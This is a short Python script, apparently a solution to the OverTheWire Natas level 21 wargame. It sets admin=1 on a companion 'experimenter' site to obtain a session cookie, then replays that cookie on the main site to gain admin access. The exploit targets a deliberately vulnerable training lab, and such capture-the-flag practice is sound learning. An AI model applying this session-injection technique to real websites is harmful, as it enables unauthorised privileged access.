import requests

target = "http://natas21-experimenter.natas.labs.overthewire.org"
auth = ('natas21', '[PW_HERE]')
params = dict(debug='', submit='', admin=1)
cookies = dict()

response = requests.get(target, auth=auth, params=params, cookies=cookies)
phpsessid = response.cookies['PHPSESSID']
print(response.text)

target = 'http://natas21.natas.labs.overthewire.org'
params = dict(debug='')
cookies = dict(PHPSESSID=phpsessid)
response = requests.get(target, auth=auth, params=params, cookies=cookies)
print(response.text)


